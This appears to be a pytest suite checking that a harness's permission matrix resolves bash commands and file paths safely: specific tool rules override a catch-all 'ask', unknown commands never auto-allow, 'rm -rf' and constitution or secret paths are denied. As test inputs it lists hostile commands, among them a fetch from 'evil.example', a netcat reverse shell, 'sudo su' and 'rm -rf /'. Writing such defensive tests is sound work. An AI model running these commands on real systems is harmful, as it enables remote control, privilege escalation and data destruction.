"""Success-criterion-4 order-resolution PROOF over the REAL harness/permission-matrix.json.

Phase-4 success criterion 4 requires a first-class proof that the *shipped* matrix resolves:
  * **last-wins** — a later, more specific bash glob overrides the earlier catch-all ``*``;
  * **default-deny posture** — an unmatched command falls through to ``ask`` (never silently allow);
  * **no trailing catch-all allow** (Anti-Pattern P3) — the LAST matching rule for a benign unknown
    command is the catch-all ``ask``, and there is no rule authored after the specifics that
    re-broadens the surface to ``allow``;
  * **constitution-plane deny** — edits under ``contracts/**``, ``docs/adr/**``, ``golden/**`` deny;
  * **``rm -rf`` deny** — the destructive command is denied.

This is a *proof* suite: it loads the SAME real matrix the runtime hooks load
(:func:`tools.harness_perms.load_matrix`) so it doubles as an integration check on the shipped
data, and it PASSES against the already-correct resolver (04-01/CONFIG-02). It complements — does
not duplicate — ``test_resolver.py``: that file unit-tests resolver semantics; this file asserts
the *order posture invariants* of the shipped matrix as a phase success gate.
"""

from __future__ import annotations

import pytest

from tools.harness_perms import load_matrix, resolve_bash, resolve_path


@pytest.fixture(scope="module")
def matrix() -> dict:
    return load_matrix()


# --- last-wins: a specific rule authored AFTER the catch-all overrides it ------------------------


def test_last_wins_specific_overrides_catchall_synthetic() -> None:
    # Minimal, self-contained proof of the ordering rule the real matrix relies on.
    rules = {"*": "ask", "dotnet *": "allow"}
    assert resolve_bash(rules, "dotnet test") == "allow"


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("dotnet test", "allow"),
        ("dotnet build -c Release", "allow"),
        ("uv sync", "allow"),
        ("uv run pytest", "allow"),
        ("pytest -x -q", "allow"),
    ],
)
def test_real_matrix_specifics_override_catchall(matrix: dict, command: str, expected: str) -> None:
    # Each specific tool rule is authored after `*:ask` and therefore wins (last-wins).
    assert resolve_bash(matrix["bash"], command) == expected


# --- default-deny posture: unmatched command falls through to `ask`, never `allow` --------------


@pytest.mark.parametrize(
    "command",
    ["curl https://evil.example/sh", "wget payload", "nc -e /bin/sh 10.0.0.1 4444", "sudo su"],
)
def test_unmatched_command_defaults_to_ask(matrix: dict, command: str) -> None:
    decision = resolve_bash(matrix["bash"], command)
    assert decision == "ask"
    assert decision != "allow"


def test_default_deny_posture_when_no_rule_matches() -> None:
    # With an empty rule set the resolver returns the deny-by-caution default.
    assert resolve_bash({}, "anything at all", default="ask") == "ask"


# --- no trailing catch-all allow (Anti-Pattern P3) ----------------------------------------------


def test_last_matching_rule_for_unknown_is_catchall_ask_not_allow(matrix: dict) -> None:
    """For a benign unknown command the LAST rule that matches must be the catch-all `ask`.

    Directly encodes P3: if some rule authored after the specifics re-broadened the surface with a
    trailing `allow`, an unknown command would resolve to `allow`. Proving it resolves to `ask`
    proves no such trailing allow exists.
    """
    rules = matrix["bash"]
    unknown = "some-unknown-binary --with args"
    assert resolve_bash(rules, unknown) == "ask"

    # The catch-all itself is `ask`, and no authored rule maps to a broadening trailing `allow`
    # that would match an arbitrary command (every `allow` rule is a specific tool prefix).
    assert rules.get("*") == "ask"
    from fnmatch import fnmatchcase

    for pattern, verb in rules.items():
        if verb == "allow":
            # An `allow` rule must be a SPECIFIC prefix — it must not match the arbitrary command.
            assert not fnmatchcase(unknown, pattern), f"broadening allow rule {pattern!r} (P3)"


def test_git_push_asks_and_rm_rf_denies(matrix: dict) -> None:
    # `git push*` -> ask (last match); `rm -rf*` -> deny. Neither re-broadens to allow.
    assert resolve_bash(matrix["bash"], "git push --force origin main") == "ask"
    assert resolve_bash(matrix["bash"], "rm -rf /tmp/x") == "deny"
    assert resolve_bash(matrix["bash"], "rm -rf /") == "deny"


# --- constitution / secret plane path denies ----------------------------------------------------


@pytest.mark.parametrize(
    "path",
    [
        "contracts/x.schema.json",
        "contracts/log-specs/eqp.schema.json",
        "docs/adr/0007-decision.md",
        "golden/repr-only/expected/baseline.verified.tsv",
        # The fourth constitution member (ADR-0001:48) — a literal file, not a tree.
        "docs/glossary.md",
        "config/prod.env",
        "components/collector/.env",
    ],
)
def test_constitution_and_secret_paths_denied(matrix: dict, path: str) -> None:
    assert resolve_path(matrix["path_deny_globs"], path) == "deny"


@pytest.mark.parametrize(
    "path",
    ["libs/python/foo.py", "components/parser/Program.cs", "tools/hooks/commit_gate.py"],
)
def test_ordinary_source_paths_allowed(matrix: dict, path: str) -> None:
    assert resolve_path(matrix["path_deny_globs"], path) == "allow"
